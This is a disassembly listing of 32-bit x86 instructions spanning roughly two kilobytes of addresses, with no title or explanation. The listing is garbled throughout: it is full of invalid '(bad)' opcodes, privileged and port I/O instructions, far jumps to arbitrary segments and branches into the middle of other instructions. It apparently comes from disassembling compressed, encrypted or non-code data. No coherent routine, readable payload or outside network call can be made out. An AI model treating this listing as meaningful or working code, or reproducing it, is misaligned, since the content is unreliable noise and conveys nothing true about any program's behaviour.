  40a00f:	and    al,dl
  40a011:	stc    
  40a012:	shr    esp,1
  40a014:	pushf  
  40a015:	lock cwde 
  40a017:	(bad)  
  40a018:	jmp    0xac4b2d74
  40a01d:	mov    bl,0x55
  40a01f:	inc    BYTE PTR [edx+0x74]
  40a022:	jp     0x40a01d
  40a024:	xchg   ebx,eax
  40a025:	fistp  DWORD PTR [eax]
  40a027:	pop    ecx
  40a028:	addr16 add eax,0x2e548cc5
  40a02e:	mov    ds:0x51e8c13,eax
  40a033:	bound  eax,QWORD PTR [ebx+0x64b2568e]
  40a039:	adc    al,0x9b
  40a03b:	or     al,0xc8
  40a03d:	jecxz  0x40a0a5
  40a03f:	jge    0x40a078
  40a041:	pop    eax
  40a042:	pushf  
  40a043:	pusha  
  40a044:	pop    ebx
  40a045:	hlt    
  40a046:	or     eax,0xe353fe0f
  40a04b:	je     0x40a038
  40a04d:	mov    eax,0xba99d8c3
  40a052:	hlt    
  40a053:	stos   BYTE PTR es:[edi],al
  40a054:	lea    ecx,[ebx-0x4d4452f3]
  40a05a:	sbb    esi,DWORD PTR [esi-0x36d13a4b]
  40a060:	nop
  40a061:	adc    al,0xdf
  40a063:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a064:	int3   
  40a065:	jnp    0x40a013
  40a067:	or     BYTE PTR [edx-0x5e],bh
  40a06a:	jl     0x40a080
  40a06c:	dec    ecx
  40a06d:	adc    DWORD PTR [ebx],ebp
  40a06f:	add    eax,0x8500a186
  40a074:	lods   eax,DWORD PTR ds:[esi]
  40a075:	cld    
  40a076:	(bad)  
  40a077:	push   edx
  40a078:	aad    0xe8
  40a07a:	or     al,0x65
  40a07c:	scas   eax,DWORD PTR es:[edi]
  40a07d:	push   cs
  40a07e:	pop    eax
  40a07f:	xchg   BYTE PTR [edi-0x58],dl
  40a082:	mov    esp,0x2c192e20
  40a087:	(bad)  
  40a088:	(bad)  
  40a089:	aam    0x6d
  40a08b:	dec    esp
  40a08c:	dec    eax
  40a08d:	out    0x73,eax
  40a08f:	test   eax,0x34035d83
  40a094:	dec    ebx
  40a095:	icebp  
  40a096:	daa    
  40a097:	sti    
  40a098:	fst    QWORD PTR [ecx-0x2bf8ea1]
  40a09e:	push   ebp
  40a09f:	retf   0xc0db
  40a0a2:	dec    esp
  40a0a3:	push   0x8c2f79e9
  40a0a8:	daa    
  40a0a9:	jg     0x40a0dc
  40a0ab:	shl    BYTE PTR [ecx-0x65],1
  40a0ae:	in     eax,dx
  40a0af:	fnstsw WORD PTR [edx]
  40a0b1:	push   0x88071a69
  40a0b6:	fld    DWORD PTR [edi-0x75537df9]
  40a0bc:	or     eax,0xad5b119e
  40a0c1:	fisubr WORD PTR [ebp-0x19]
  40a0c4:	pop    ebp
  40a0c5:	ja     0x40a0e4
  40a0c7:	scas   al,BYTE PTR es:[edi]
  40a0c8:	cmc    
  40a0c9:	rcr    dh,1
  40a0cb:	test   DWORD PTR [edi],edi
  40a0cd:	or     eax,0x6f367420
  40a0d2:	jns    0x40a092
  40a0d4:	push   esi
  40a0d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0d6:	push   ebp
  40a0d7:	xchg   ebx,eax
  40a0d8:	icebp  
  40a0d9:	jl     0x40a159
  40a0db:	push   ecx
  40a0dc:	das    
  40a0dd:	lds    esp,FWORD PTR [ebp+esi*4+0x37]
  40a0e1:	fucom  st(5)
  40a0e3:	or     BYTE PTR [edi+0x27b33dd8],ch
  40a0e9:	hlt    
  40a0ea:	xor    BYTE PTR [ebx+0x50],cl
  40a0ed:	je     0x40a156
  40a0ef:	push   esi
  40a0f0:	mov    DWORD PTR [ebx-0x1d110efd],eax
  40a0f6:	out    dx,al
  40a0f7:	(bad)  
  40a0f8:	cld    
  40a0f9:	xchg   BYTE PTR [ebp+0x12],ch
  40a0fc:	nop
  40a0fd:	ret    0xc82b
  40a100:	int    0x96
  40a102:	add    BYTE PTR [ebx+0x71],dh
  40a105:	jecxz  0x40a0d1
  40a107:	aas    
  40a108:	outs   dx,DWORD PTR ds:[esi]
  40a109:	scas   eax,DWORD PTR es:[edi]
  40a10a:	cli    
  40a10b:	dec    esi
  40a10c:	add    edx,DWORD PTR [esi-0xc]
  40a10f:	enter  0x655,0x58
  40a113:	mov    ds:0x38d8680d,al
  40a118:	sbb    bh,bl
  40a11a:	adc    edx,edi
  40a11c:	inc    edx
  40a11d:	fimul  WORD PTR [esi]
  40a11f:	mov    esp,0xb8b99e42
  40a124:	nop
  40a125:	jge    0x40a102
  40a127:	xchg   al,bh
  40a129:	imul   eax,DWORD PTR [edx],0xd7179451
  40a12f:	popa   
  40a130:	nop
  40a131:	add    al,BYTE PTR [ebp-0x56]
  40a134:	in     eax,0x69
  40a136:	sahf   
  40a137:	cmp    bl,al
  40a139:	cmp    DWORD PTR [ebx],0x47985cc5
  40a13f:	rcr    BYTE PTR [esi],cl
  40a141:	add    DWORD PTR [esi+0x2],0x4ca5dd24
  40a148:	inc    esp
  40a149:	mov    bh,0x23
  40a14b:	aas    
  40a14c:	push   ebx
  40a14d:	aad    0x94
  40a14f:	mov    ss,WORD PTR [ecx-0x379bdbcc]
  40a155:	or     esp,DWORD PTR [ebx]
  40a157:	mov    ds:0x455ed6d3,eax
  40a15c:	ss lahf 
  40a15e:	nop
  40a15f:	jp     0x40a147
  40a161:	(bad)  
  40a162:	mov    esi,0x93371f73
  40a167:	or     eax,0xe170c9a6
  40a16c:	retf   
  40a16d:	xor    eax,0xd50f8cf7
  40a172:	shl    BYTE PTR [edx-0x6d4a9b92],0x42
  40a179:	pop    edx
  40a17a:	mov    ds:0x15cccdd6,eax
  40a17f:	cmp    esi,DWORD PTR [ecx+0x9e84894]
  40a185:	pop    edi
  40a186:	lds    ebx,FWORD PTR [esi+ecx*2-0x5cd07394]
  40a18d:	add    al,0xd9
  40a18f:	add    al,0x49
  40a191:	mov    edx,0xadc3cf97
  40a196:	pop    ebx
  40a197:	test   DWORD PTR [edi+0x60],edi
  40a19a:	mov    edx,0xedcf9234
  40a19f:	por    mm2,QWORD PTR [ebx+0x23]
  40a1a3:	jae    0x40a12e
  40a1a5:	lea    edx,[eax+0x7fe95ef2]
  40a1ab:	adc    dl,BYTE PTR [eax+0x77]
  40a1ae:	mov    bl,0xe
  40a1b0:	test   DWORD PTR [ebx+0x7c],ebx
  40a1b3:	(bad)  
  40a1b4:	adc    bh,cl
  40a1b6:	pop    eax
  40a1b7:	jbe    0x40a145
  40a1b9:	push   cs
  40a1ba:	pop    ss
  40a1bb:	xor    ebp,ecx
  40a1bd:	jg     0x40a1ce
  40a1bf:	jge    0x40a149
  40a1c1:	jbe    0x40a16e
  40a1c3:	push   edx
  40a1c4:	test   BYTE PTR [eax-0x2e],dh
  40a1c7:	les    ebp,FWORD PTR [edx]
  40a1c9:	pand   mm4,mm7
  40a1cc:	push   0xe
  40a1ce:	push   esi
  40a1cf:	cmp    eax,0x2a0f6590
  40a1d4:	cld    
  40a1d5:	stc    
  40a1d6:	xor    al,0xef
  40a1d8:	or     edx,ebp
  40a1da:	mov    eax,0x68c7236f
  40a1df:	add    BYTE PTR [ebp+0x28],0xf2
  40a1e3:	jne    0x40a16d
  40a1e5:	inc    esi
  40a1e6:	pop    es
  40a1e7:	jo     0x40a1d7
  40a1e9:	xchg   edx,eax
  40a1ea:	popf   
  40a1eb:	mov    esp,0xb67a9b38
  40a1f0:	push   DWORD PTR ds:0x67e9d829
  40a1f6:	int    0xfe
  40a1f8:	rol    eax,cl
  40a1fa:	lods   al,BYTE PTR ss:[esi]
  40a1fc:	jbe    0x40a1e9
  40a1fe:	ret    0x7f83
  40a201:	mov    bl,0xb9
  40a203:	(bad)  
  40a204:	fnsave [esi+0x7d]
  40a207:	in     al,0xfd
  40a209:	jmp    0x777cbb6c
  40a20e:	loop   0x40a280
  40a210:	mov    ecx,0x15713e4
  40a215:	retf   0x6054
  40a218:	mov    fs,WORD PTR [eax-0x3d6b90bd]
  40a21e:	add    dh,BYTE PTR ds:0x3e08ba77
  40a224:	inc    edx
  40a225:	pop    ss
  40a226:	inc    edx
  40a227:	xchg   esp,eax
  40a228:	data16 jge 0x40a1bf
  40a22b:	popf   
  40a22c:	push   0x68
  40a22e:	jae    0x40a297
  40a230:	in     al,dx
  40a231:	xchg   ebp,eax
  40a232:	dec    ebx
  40a233:	aam    0xa1
  40a235:	fsubr  QWORD PTR [esi-0x338bbd72]
  40a23b:	(bad)  
  40a23c:	cmp    al,0x8a
  40a23e:	jle    0x40a290
  40a240:	fcmovbe st,st(7)
  40a242:	jnp    0x40a22c
  40a244:	or     BYTE PTR [esi],al
  40a246:	imul   esp
  40a248:	xchg   ebp,eax
  40a249:	push   ebp
  40a24a:	scas   al,BYTE PTR es:[edi]
  40a24b:	je     0x40a1fb
  40a24d:	dec    ebp
  40a24e:	repz leave 
  40a250:	dec    esp
  40a251:	dec    edi
  40a252:	sub    eax,0xeb299ada
  40a257:	out    0x5a,eax
  40a259:	push   0x669b9a0
  40a25e:	lea    edx,[eax]
  40a260:	(bad)  
  40a261:	(bad)  [ebx-0x68]
  40a264:	lds    edi,FWORD PTR [ebx]
  40a266:	mov    bl,0x23
  40a268:	mov    edx,0xf0d31744
  40a26d:	jl     0x40a274
  40a26f:	jb     0x40a268
  40a271:	pop    eax
  40a272:	(bad)
  40a275:	xchg   ebp,eax
  40a276:	cmp    DWORD PTR [edx-0x3354c15d],0x7a7f71d4
  40a280:	fbstp  TBYTE PTR [ebx]
  40a282:	stos   BYTE PTR es:[edi],al
  40a283:	adc    al,0xaf
  40a285:	dec    esp
  40a286:	and    DWORD PTR [esi],eax
  40a288:	mov    BYTE PTR [edi],ah
  40a28a:	cmp    BYTE PTR [eax-0x7e],cl
  40a28d:	int3   
  40a28e:	popf   
  40a28f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a290:	adc    esi,DWORD PTR [edi+0x584e423c]
  40a296:	in     al,0x86
  40a298:	sbb    dl,bl
  40a29a:	and    ebp,esi
  40a29c:	and    ecx,edx
  40a29e:	(bad)  
  40a29f:	inc    esi
  40a2a0:	in     al,0xdc
  40a2a2:	cwde   
  40a2a3:	pop    ds
  40a2a4:	les    esp,FWORD PTR [ebx+ebp*1+0x74]
  40a2a8:	shl    ch,0x83
  40a2ab:	xor    DWORD PTR [eax+0x5d],ebx
  40a2ae:	and    ch,cl
  40a2b0:	adc    eax,DWORD PTR [edx]
  40a2b2:	stos   DWORD PTR es:[edi],eax
  40a2b3:	sti    
  40a2b4:	adc    eax,DWORD PTR [edx+ecx*1+0x6b]
  40a2b8:	xor    BYTE PTR [eax+0x32],ah
  40a2bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bc:	adc    al,BYTE PTR [eax]
  40a2be:	jg     0x40a2fa
  40a2c0:	hlt    
  40a2c1:	mov    ecx,0x7d35542a
  40a2c6:	es pop esi
  40a2c8:	pop    ebx
  40a2c9:	cmc    
  40a2ca:	sbb    BYTE PTR [esi-0x35],dl
  40a2cd:	sar    DWORD PTR [esp+eax*4+0x3ce2c73f],0xb8
  40a2d5:	inc    ebx
  40a2d6:	nop
  40a2d7:	icebp  
  40a2d8:	or     DWORD PTR [edx],ebx
  40a2da:	pop    es
  40a2db:	pop    esi
  40a2dc:	retf   
  40a2dd:	jge    0x40a2e1
  40a2df:	loop   0x40a2ff
  40a2e1:	push   0x3b
  40a2e3:	jle    0x40a2cc
  40a2e5:	sub    al,0x31
  40a2e7:	inc    esi
  40a2e8:	sbb    eax,0x2135c314
  40a2ed:	pop    ds
  40a2ee:	jns    0x40a2ef
  40a2f0:	jge    0x40a2cf
  40a2f2:	fs mov dh,0xf3
  40a2f5:	mov    al,BYTE PTR [edi-0x2f86ae55]
  40a2fb:	test   al,0x5f
  40a2fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2fe:	push   edi
  40a2ff:	jns    0x40a2c7
  40a301:	mov    ebp,gs
  40a303:	(bad)  
  40a304:	pop    eax
  40a305:	icebp  
  40a306:	lock push ss
  40a308:	je     0x40a2d8
  40a30a:	xor    dl,dh
  40a30c:	xchg   esi,eax
  40a30d:	cmp    eax,0x5293ab64
  40a312:	jns    0x40a336
  40a314:	inc    esi
  40a315:	je     0x40a2a1
  40a317:	pop    ebp
  40a318:	aad    0xbb
  40a31a:	mov    DWORD PTR [ebx+ebp*1-0x5],edi
  40a31e:	add    esi,edx
  40a320:	mov    ds:0xcfb033e7,al
  40a325:	setg   ah
  40a328:	pop    ecx
  40a329:	inc    esi
  40a32a:	cld    
  40a32b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a32c:	jb     0x40a339
  40a32e:	(bad)  
  40a32f:	je     0x40a347
  40a331:	and    BYTE PTR [edx+0x191e7fab],ah
  40a337:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a338:	mov    dh,0x57
  40a33a:	xchg   esp,eax
  40a33b:	xor    BYTE PTR [edi-0x799e3e9],cl
  40a341:	push   ecx
  40a342:	mov    esi,0xa643908e
  40a347:	leave  
  40a348:	push   es
  40a349:	push   edx
  40a34a:	gs stc 
  40a34c:	push   esi
  40a34d:	mov    ah,0xc2
  40a34f:	jg     0x40a2db
  40a351:	and    al,0x8d
  40a353:	loope  0x40a3ae
  40a355:	mov    DWORD PTR [ebx+0x35069109],ebp
  40a35b:	pop    DWORD PTR [edx-0x2c06906e]
  40a361:	mov    esp,0xd67b0d89
  40a366:	les    ebp,FWORD PTR [edi+0x1bf443e5]
  40a36c:	cmc    
  40a36d:	sti    
  40a36e:	adc    DWORD PTR [edi+0x19d81454],0x44
  40a375:	(bad)  
  40a376:	jmp    0xa5b1ea16
  40a37b:	test   dl,al
  40a37d:	pop    ebp
  40a37e:	mov    al,ds:0x25cb8e17
  40a383:	inc    esi
  40a384:	leave  
  40a385:	data16 fs sti 
  40a388:	lods   al,BYTE PTR ds:[esi]
  40a389:	shl    DWORD PTR [ecx],cl
  40a38b:	out    0x4b,al
  40a38d:	ins    DWORD PTR es:[edi],dx
  40a38e:	and    ebx,DWORD PTR [ebx-0x4d2d0d79]
  40a394:	(bad)  
  40a395:	sub    al,0x80
  40a397:	in     al,0xdc
  40a399:	jge    0x40a33f
  40a39b:	stos   DWORD PTR es:[edi],eax
  40a39c:	mov    ds:0xe28ea985,al
  40a3a1:	pop    ebp
  40a3a2:	mov    al,ds:0x6dbbe712
  40a3a7:	out    dx,eax
  40a3a8:	test   DWORD PTR ss:[ebp-0x23673e5],0xbd43517d
  40a3b3:	cdq    
  40a3b4:	adc    dl,dh
  40a3b6:	inc    edx
  40a3b7:	js     0x40a3eb
  40a3b9:	data16 into 
  40a3bb:	dec    edi
  40a3bc:	add    edi,DWORD PTR [edi+ecx*4-0x44]
  40a3c0:	test   al,0xd0
  40a3c2:	stos   DWORD PTR es:[edi],eax
  40a3c3:	push   ebx
  40a3c4:	cmp    BYTE PTR [edx+eax*8-0x1daf97bc],ah
  40a3cb:	push   es
  40a3cc:	mov    bh,0x5c
  40a3ce:	fist   WORD PTR [edx+edx*8]
  40a3d1:	pop    es
  40a3d2:	retf   
  40a3d3:	imul   esp,esi,0x73a7d5e7
  40a3d9:	add    al,0xa1
  40a3db:	adc    esi,edi
  40a3dd:	xchg   edx,eax
  40a3de:	fwait
  40a3df:	sub    eax,0xa336fabc
  40a3e4:	pop    ebp
  40a3e5:	(bad)  
  40a3e6:	stos   BYTE PTR es:[edi],al
  40a3e7:	dec    ecx
  40a3e8:	cmc    
  40a3e9:	gs inc edi
  40a3eb:	xchg   ebx,eax
  40a3ec:	pop    es
  40a3ed:	pop    esp
  40a3ee:	adc    BYTE PTR [ebx+0x35cde9cb],bh
  40a3f4:	test   eax,0xa6aeb964
  40a3f9:	inc    ecx
  40a3fa:	sub    eax,0xb1b378c8
  40a3ff:	pushf  
  40a400:	xchg   edx,eax
  40a401:	pop    eax
  40a402:	push   edx
  40a403:	mov    edi,0x59772a48
  40a408:	loopne 0x40a482
  40a40a:	sub    DWORD PTR [esp+eax*2+0x7b],esp
  40a40e:	fisttp WORD PTR [esi+0x235fd259]
  40a414:	push   edi
  40a415:	mov    bh,0x26
  40a417:	dec    edi
  40a418:	inc    edi
  40a419:	test   al,0xb0
  40a41b:	push   0xe
  40a41d:	data16 add BYTE PTR [esi-0x788d441c],bl
  40a424:	xor    DWORD PTR [edi],ebp
  40a426:	mov    esp,0x2d827ca8
  40a42b:	repnz fimul WORD PTR [ecx+eiz*2]
  40a42f:	aas    
  40a430:	pushf  
  40a431:	inc    edi
  40a432:	popf   
  40a433:	fisttp WORD PTR [edi-0x6b]
  40a436:	(bad)  
  40a437:	mov    ecx,0xe11d4444
  40a43c:	sar    bl,1
  40a43e:	repnz out 0xb8,al
  40a441:	scas   eax,DWORD PTR es:[edi]
  40a442:	inc    BYTE PTR [esi+0x825ec4c]
  40a448:	mov    ah,bh
  40a44a:	push   eax
  40a44b:	pop    ebx
  40a44c:	nop
  40a44d:	cmp    al,0xa3
  40a44f:	xchg   DWORD PTR [eax+0xc],esi
  40a452:	and    ebp,DWORD PTR [ecx]
  40a454:	aad    0xdb
  40a456:	push   ds
  40a457:	inc    ecx
  40a458:	pop    ds
  40a459:	jbe    0x40a40c
  40a45b:	or     ebx,esp
  40a45d:	push   esi
  40a45e:	outs   dx,DWORD PTR ds:[esi]
  40a45f:	and    al,0x35
  40a461:	pop    esp
  40a462:	pop    esi
  40a463:	jae    0x40a413
  40a465:	add    ebp,DWORD PTR [edi+edx*8+0x52]
  40a469:	cld    
  40a46a:	loopne 0x40a3f1
  40a46c:	test   esi,esi
  40a46e:	cmp    DWORD PTR [ebx+eiz*8],eax
  40a471:	add    BYTE PTR [ecx-0x54],0xd2
  40a475:	cmp    edi,0x8d9d6c7d
  40a47b:	mov    dl,0x2b
  40a47d:	mov    dh,0x3f
  40a47f:	add    dl,BYTE PTR [ecx]
  40a481:	mov    al,0x39
  40a483:	add    eax,0xbeaed54f
  40a488:	add    DWORD PTR [eax-0x5076781c],ebx
  40a48e:	dec    edx
  40a48f:	xor    BYTE PTR [ebx+0x1b],bh
  40a492:	inc    ebp
  40a493:	lods   al,BYTE PTR ds:[esi]
  40a495:	adc    al,0x7
  40a497:	bnd jg 0x40a45e
  40a49a:	mov    ebx,0xc91c552a
  40a49f:	(bad)  
  40a4a1:	jmp    0xb3ba7339
  40a4a6:	(bad)  
  40a4a7:	rcl    DWORD PTR [esi-0x35],0xfa
  40a4ab:	dec    edx
  40a4ac:	xlat   BYTE PTR ds:[ebx]
  40a4ad:	inc    eax
  40a4ae:	mov    ebx,0xa4c1d643
  40a4b3:	mov    edx,0xd44e550f
  40a4b8:	xchg   esi,eax
  40a4b9:	push   esp
  40a4ba:	adc    al,0xfe
  40a4bc:	jno    0x40a523
  40a4be:	mov    al,ds:0x135689e0
  40a4c3:	add    BYTE PTR [ebp+0x5ab0978a],ch
  40a4c9:	pop    ss
  40a4ca:	cmp    eax,0x2be16078
  40a4cf:	scas   eax,DWORD PTR es:[edi]
  40a4d0:	dec    ecx
  40a4d1:	je     0x40a460
  40a4d3:	push   es
  40a4d4:	xor    al,0x95
  40a4d6:	arpl   WORD PTR [esi+ebp*2],sp
  40a4d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4da:	inc    esi
  40a4db:	mov    ds:0x655b1889,eax
  40a4e0:	sahf   
  40a4e1:	call   0xdf18:0x99df6455
  40a4e8:	data16 int 0x14
  40a4eb:	mov    dl,0x4
  40a4ed:	pop    ds
  40a4ee:	test   DWORD PTR [edx-0x2137ba7],ecx
  40a4f4:	stc    
  40a4f5:	pop    ebx
  40a4f6:	fs dec esp
  40a4f8:	pop    ebx
  40a4f9:	or     bl,0x50
  40a4fc:	pop    ecx
  40a4fd:	shl    BYTE PTR ds:0xbd19d071,cl
  40a503:	push   ss
  40a504:	add    BYTE PTR [ecx-0x69],dl
  40a507:	mov    dh,0x64
  40a509:	inc    edi
  40a50a:	mov    esp,0x3c99b7e
  40a50f:	test   al,0xa
  40a511:	jmp    0x3e5f:0x84771a5b
  40a518:	dec    esp
  40a519:	jbe    0x40a591
  40a51b:	(bad)  
  40a51c:	out    dx,eax
  40a51d:	or     dh,BYTE PTR [ebx-0x3a]
  40a520:	mov    ebp,0xbc13855d
  40a525:	ds (bad) 
  40a528:	and    DWORD PTR [edx],esp
  40a52a:	dec    ebx
  40a52b:	sbb    dl,BYTE PTR [ecx]
  40a52d:	mov    edx,esi
  40a52f:	popf   
  40a530:	retf   
  40a531:	repnz xor ebx,DWORD PTR [edx-0x26]
  40a535:	and    dh,BYTE PTR [ecx-0x55]
  40a538:	(bad)
  40a53b:	cdq    
  40a53c:	(bad)  
  40a53d:	js     0x40a55c
  40a53f:	xchg   edx,eax
  40a540:	cmp    bl,BYTE PTR [eax-0x4a]
  40a543:	addr16 ja 0x40a526
  40a546:	mov    cl,0x7a
  40a548:	add    ecx,ecx
  40a54a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a54b:	sbb    al,0xa6
  40a54d:	jo     0x40a4e4
  40a54f:	inc    ebp
  40a550:	bound  ecx,QWORD PTR [ecx]
  40a552:	dec    edx
  40a553:	imul   esp,DWORD PTR [edx-0x364b1d],0xffffffed
  40a55a:	das    
  40a55b:	(bad)
  40a55f:	adc    ch,cl
  40a561:	push   edi
  40a562:	sbb    al,0x83
  40a564:	pop    ss
  40a565:	sbb    eax,0xbdbf82d6
  40a56a:	js     0x40a557
  40a56c:	aaa    
  40a56d:	push   esp
  40a56e:	outs   dx,BYTE PTR ds:[esi]
  40a56f:	lea    ebx,[eax+0x68ba8957]
  40a575:	gs js  0x40a51c
  40a578:	pushf  
  40a579:	and    cl,cl
  40a57b:	mov    eax,ds:0xf33f2fc6
  40a580:	cld    
  40a581:	mov    ds:0xb44625bb,al
  40a586:	mov    esi,0xc9e00e18
  40a58b:	add    eax,edi
  40a58d:	cdq    
  40a58e:	mov    cl,0x1
  40a590:	push   esi
  40a591:	leave  
  40a592:	jecxz  0x40a5d7
  40a594:	sbb    bl,BYTE PTR [eax+0x1ef48449]
  40a59a:	push   cs
  40a59b:	pop    eax
  40a59c:	dec    ecx
  40a59d:	sub    al,0x86
  40a59f:	sbb    eax,0xaf0ee466
  40a5a4:	or     BYTE PTR ds:0x8b2e34e2,ah
  40a5aa:	nop
  40a5ab:	lds    ecx,FWORD PTR [edx+0x35]
  40a5ae:	sub    BYTE PTR [eax+0x6a3a1f22],al
  40a5b4:	add    esp,edx
  40a5b6:	and    dl,BYTE PTR [edi-0x24]
  40a5b9:	mov    ds:0xa4ac2e47,al
  40a5be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5bf:	pop    ss
  40a5c0:	jl     0x40a5ab
  40a5c2:	add    ax,WORD PTR [edx+ebp*8-0x6d4b0789]
  40a5ca:	nop
  40a5cb:	repz cmp DWORD PTR [edx+0x793c3c91],edx
  40a5d2:	add    al,0xd4
  40a5d4:	loop   0x40a5de
  40a5d6:	mov    eax,0x8b174418
  40a5db:	es sbb al,0x1c
  40a5de:	sbb    BYTE PTR [esi-0x1fb27766],dl
  40a5e4:	pop    ecx
  40a5e5:	xor    BYTE PTR [esi],ah
  40a5e7:	mov    DWORD PTR ds:0xe61b6a7b,esi
  40a5ed:	mov    edi,0xdfa99a32
  40a5f2:	clc    
  40a5f3:	ss and ecx,ebx
  40a5f6:	lea    ebx,[ecx+0x6b9f585b]
  40a5fc:	or     eax,0xac260edf
  40a601:	mov    eax,ds:0x80ed91b0
  40a606:	pop    esi
  40a607:	(bad)  
  40a608:	bound  esp,QWORD PTR [edi+esi*2-0x54]
  40a60c:	adc    al,0x8f
  40a60e:	xchg   ebx,eax
  40a60f:	sub    al,0xbd
  40a611:	int    0x76
  40a613:	stc    
  40a614:	addr16 xchg ecx,eax
  40a616:	ror    DWORD PTR [esi+0x7004a408],1
  40a61c:	lods   al,BYTE PTR ds:[esi]
  40a61d:	jb     0x40a61a
  40a61f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a620:	cs adc edi,ebx
  40a623:	inc    eax
  40a624:	add    eax,0x27fad78e
  40a629:	bound  esi,QWORD PTR ds:[edx]
  40a62c:	out    0x69,al
  40a62e:	sub    BYTE PTR ds:0xdae290cd,dl
  40a634:	in     eax,0xa4
  40a636:	xchg   edx,eax
  40a637:	add    al,0xe0
  40a639:	or     dl,BYTE PTR [eax-0x68]
  40a63c:	lahf   
  40a63d:	sbb    DWORD PTR [edx],ebx
  40a63f:	leave  
  40a640:	aaa    
  40a641:	ficom  DWORD PTR ds:0xdf803782
  40a647:	push   eax
  40a648:	mov    cl,BYTE PTR ds:0x9fa1dcb6
  40a64e:	cmp    bl,bh
  40a650:	test   DWORD PTR [ebx-0x30],esp
  40a653:	pop    ebx
  40a654:	mov    DWORD PTR [ecx+0x7a],0x388f94da
  40a65b:	mov    esi,0xde45c276
  40a660:	hlt    
  40a661:	inc    esp
  40a662:	in     al,dx
  40a663:	nop
  40a664:	xor    al,0x24
  40a666:	dec    ebx
  40a667:	int3   
  40a668:	jg     0x40a666
  40a66a:	inc    esp
  40a66b:	inc    ecx
  40a66c:	fs out 0x34,al
  40a66f:	ret    
  40a670:	sar    DWORD PTR [ebx],1
  40a672:	icebp  
  40a673:	inc    ecx
  40a674:	sub    ecx,edi
  40a676:	pop    es
  40a677:	out    0xd1,eax
  40a679:	test   eax,0xd45f895f
  40a67e:	xor    al,BYTE PTR [edx+0x60018860]
  40a684:	xchg   BYTE PTR [edi+0x118ea0f7],dh
  40a68a:	pushf  
  40a68b:	dec    eax
  40a68c:	ss clc 
  40a68e:	shl    BYTE PTR [ebx+0x7cb9725],1
  40a694:	ror    edi,1
  40a696:	mov    al,0x84
  40a698:	cdq    
  40a699:	dec    esi
  40a69a:	leave  
  40a69b:	jecxz  0x40a718
  40a69d:	jne    0x40a65a
  40a69f:	outs   dx,DWORD PTR ds:[esi]
  40a6a0:	and    eax,0x51f442b5
  40a6a5:	mov    dl,BYTE PTR [ebx-0x21]
  40a6a8:	int    0xb0
  40a6aa:	inc    edi
  40a6ab:	jo     0x40a721
  40a6ad:	lods   al,BYTE PTR ds:[esi]
  40a6ae:	mov    eax,ds:0x4e1f8f24
  40a6b3:	sete   BYTE PTR [ebx]
  40a6b6:	imul   eax,DWORD PTR [esp+ebx*4],0xc68fd8c8
  40a6bd:	mov    ebx,0x97a7b00
  40a6c2:	push   0xda9ecf44
  40a6c7:	int    0xb3
  40a6c9:	mov    ch,cl
  40a6cb:	(bad)  
  40a6cc:	sub    eax,0x55d10800
  40a6d1:	pop    ds
  40a6d2:	and    al,0x6a
  40a6d4:	mov    eax,ds:0x447de2fa
  40a6d9:	push   0x75
  40a6db:	jmp    0xad7f:0xeb9bccfc
  40a6e2:	std    
  40a6e3:	adc    al,0x47
  40a6e5:	pop    edi
  40a6e6:	dec    ecx
  40a6e7:	and    eax,0x53ddece0
  40a6ec:	push   cs
  40a6ed:	xchg   edi,eax
  40a6ee:	mov    ah,0x5b
  40a6f0:	stos   BYTE PTR es:[edi],al
  40a6f1:	mov    edi,edx
  40a6f3:	loopne 0x40a709
  40a6f5:	jae    0x40a702
  40a6f7:	lahf   
  40a6f8:	xor    bl,BYTE PTR [edx+0x6d]
  40a6fb:	sbb    BYTE PTR ds:0x7d6ff6c5,0x3d
  40a702:	sbb    DWORD PTR [edx+0x6aae8a9c],ecx
  40a708:	das    
  40a709:	inc    eax
  40a70a:	jle    0x40a703
  40a70c:	sbb    di,WORD PTR [ecx+0x696d5086]
  40a713:	arpl   bp,sp
  40a715:	fld    DWORD PTR [edi]
  40a717:	push   edi
  40a718:	sub    ch,BYTE PTR [ebx-0x68]
  40a71b:	fsubr  DWORD PTR [esi+0x53]
  40a71e:	mov    ecx,0xae0f7c93
  40a723:	jmp    0x5d60:0xfed9f1d0
  40a72a:	mov    ds:0xbcec8657,al
  40a72f:	push   ds
  40a730:	sbb    BYTE PTR ds:0x2dc0801a,cl
  40a736:	fisttp WORD PTR [eax]
  40a738:	adc    BYTE PTR [bx],cl
  40a73b:	mov    ds:0x2c5b774c,eax
  40a740:	ss popa 
  40a742:	mov    eax,0xe8117330
  40a747:	sbb    eax,0x69a54d4c
  40a74c:	mov    cl,0x7b
  40a74e:	sbb    eax,0xdd8d8907
  40a753:	lods   eax,DWORD PTR ds:[esi]
  40a754:	prefetcht0 BYTE PTR [eax+0x77]
  40a758:	ins    DWORD PTR es:[edi],dx
  40a759:	mov    bl,bh
  40a75b:	and    al,0x95
  40a75d:	or     DWORD PTR [edi-0x55c39c39],0x2c
  40a764:	mov    ecx,0x6c8fc215
  40a769:	inc    esp
  40a76a:	inc    edi
  40a76b:	cmp    al,al
  40a76d:	xchg   edi,eax
  40a76e:	sti    
  40a76f:	pop    edx
  40a770:	xchg   esp,eax
  40a771:	lds    edx,FWORD PTR [eax-0x61]
  40a774:	out    0xfc,eax
  40a776:	add    edi,DWORD PTR [ecx+0x68581d1c]
  40a77c:	push   edx
  40a77d:	iret   
  40a77e:	aas    
  40a77f:	dec    eax
  40a780:	and    ah,ch
  40a782:	jmp    0x5308007f
  40a787:	xchg   esp,eax
  40a788:	bound  ebx,QWORD PTR [edx-0x62908dd2]
  40a78e:	call   0x5d98:0x4e58cd97
  40a795:	lss    edx,FWORD PTR [edi]
  40a798:	sbb    al,0x71
  40a79a:	adc    DWORD PTR [edi],edi
  40a79c:	lds    edi,FWORD PTR [esi+0x537e1937]
  40a7a2:	loop   0x40a7e8
  40a7a4:	or     ah,BYTE PTR [esp+ebp*4+0x76502f70]
